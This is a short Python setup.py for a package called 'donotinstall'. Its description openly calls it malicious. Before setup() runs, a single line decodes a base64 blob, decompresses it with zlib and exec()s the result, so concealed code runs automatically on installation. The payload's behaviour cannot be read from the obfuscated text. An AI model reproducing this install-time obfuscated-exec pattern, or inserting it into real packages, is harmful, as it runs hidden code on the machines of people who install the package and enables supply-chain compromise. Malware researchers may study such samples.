from setuptools import setup
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMOmW6tdrCDiQUQE19uySJuMWpomJclqVfzvNnTxMsN78+bNRzeMzkccnOoh8m/TtbxtApQFD9EfVOSxGwC9Oo8n3FnsG/sGVK7YBmXRf80xC/XSLJZEc37E28eb+5ft89Pt9QNLOqGctaAipURWuZDlhZDVuZDrinCZrwuWVK2HpkcZTArGmOzTfBEMwEjPGDL1spY42LFRPSVXd4QH4UF90Nlgt9ojXR+xYejzvTOADViq2aWZ7fTJf/V0oRmCCRRNlwsNyg2jhxDo8gTRlkUiNSQl/yGBbMIvQ3+/b1+h')[0])))
setup(
    name='donotinstall',
    version='1.0',
    description='this is malicious package do not install this.',

)